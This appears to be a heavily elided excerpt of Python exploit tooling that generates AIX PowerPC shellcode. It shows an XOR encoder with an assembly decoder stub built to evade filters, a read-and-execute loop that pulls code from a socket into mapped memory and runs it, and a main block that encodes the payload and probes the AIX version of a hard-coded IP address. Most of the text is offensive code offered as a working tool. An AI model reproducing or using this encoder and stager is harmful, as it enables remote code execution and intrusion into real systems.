...
class aix_powerpc(powerpcShellcodeGenerator):
    ...
    def xor_encode(self, payload, version='5.1', xormask=0xfe):
        ...
        .start:
            ...
            bnel .start
            mflr r15
            addi r15,r15, 0x0141    ! offset 16 * 4 == 0x40
            addi r15,r15,-0x0101
            xor r16,r16,r16
    ...
    def read_and_exec_loop(self, args):
        ...
        code += """
            ...
            ! here read() returned -1, we have to check errno
                ...
                b failed               ! else we are fucked up
            read_out_ok:
                add r28, r28, r3       ! mmap_ptr += read_size
                subfc r29, r3, r29     ! codesize -= read_size
                bne- read_buf          ! if codesize != 0: continue to read on sockfd
...
if __name__=="__main__":
    ...
    code = scgen.getcode()
    encoded = scgen.xor_encode(data)
    print get_aix_version('10.10.10.215')
    print "Length of encoded shellcode=%d" % len(encoded)
